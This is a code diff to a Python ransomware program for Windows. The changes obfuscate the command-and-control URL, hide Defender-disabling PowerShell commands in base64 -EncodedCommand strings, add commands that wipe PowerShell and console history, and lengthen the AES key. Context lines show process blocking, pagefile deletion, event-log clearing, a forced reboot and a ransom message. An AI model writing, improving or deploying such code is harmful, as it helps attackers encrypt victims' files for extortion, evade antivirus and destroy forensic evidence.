@@ -27,14 +27,16 @@ from concurrent.futures import ThreadPoolExecutor
 
 import requests
 import winshell
+from edx42 import dx42
 from Crypto.Cipher import AES  # hidden import
 from Crypto.PublicKey import RSA
 from win32com.client import Dispatch
 from file_crypto import encrypt_file  # type: ignore
 from Crypto.Cipher import PKCS1_OAEP
 
-YOUR_URL = "YOUR_URL"
-# with open("url", "r") as f: YOUR_URL = f.read()
+YOUR_URL = dx42("YOUR_ENCODED_URL").decode() # replace with your encoded URL
+# Using the ex42 function from the edx42 module to encode the URL
+# Example: encoded_url = ex42("https://example.com".encode())
 id = ""
 
 RSA_PUBLIC_KEY = """-----BEGIN RSA PUBLIC KEY-----
@@ -308,15 +310,10 @@ def check_connection(url="http://www.google.com/", timeout=30):
 
 def block_processes():
     execute_command("powercfg /h off")
-    execute_command(
-        'powershell -Command "Set-MpPreference -DisableTamperProtection $true"'
-    )
-    execute_command(
-        'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
-    )
-    execute_command(
-        'powershell -Command "Set-MpPreference -EnableControlledFolderAccess Disabled"'
-    )
+    execute_command("powershell -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBUAGEAbQBwAGUAcgBQAHIAbwB0AGUAYwB0AGkAbwBuACAAJAB0AHIAdQBlAA==")
+    execute_command("powershell -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA=")
+    execute_command("powershell -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQBuAGEAYgBsAGUAQwBvAG4AdAByAG8AbABsAGUAZABGAG8AbABkAGUAcgBBAGMAYwBlAHMAcwAgAEQAaQBzAGEAYgBsAGUAZAA=")
+    execute_command("powershell -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUABTAFIAZQBhAGQATABpAG4AZQBcAEMAbwBuAHMAbwBsAGUASABvAHMAdABfAGgAaQBzAHQAbwByAHkALgB0AHgAdAAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA==")
     blocked_processes = [
         "cmd",
         "powershell",
@@ -339,7 +336,7 @@ def encrypt_key(aes_key):
 def start_encryption():
     global id
     id = uuid.uuid1()
-    key = bytearray(get_random_bytes(16))
+    key = bytearray(get_random_bytes(32))
     try:
         mlock(key)
 
@@ -473,7 +470,8 @@ Don't Cry, just pay =}}"""
         f"wmic pagefileset where \"name='{os.getenv("SystemDrive")}\\pagefile.sys'\" delete"
     )
     clear_event_logs()
-    execute_command("shutdown /r /f /t 2")
+    execute_command("doskey /listsize=0")
+    execute_command("shutdown /r /f /t 3")
     disable_cmd()
 
 
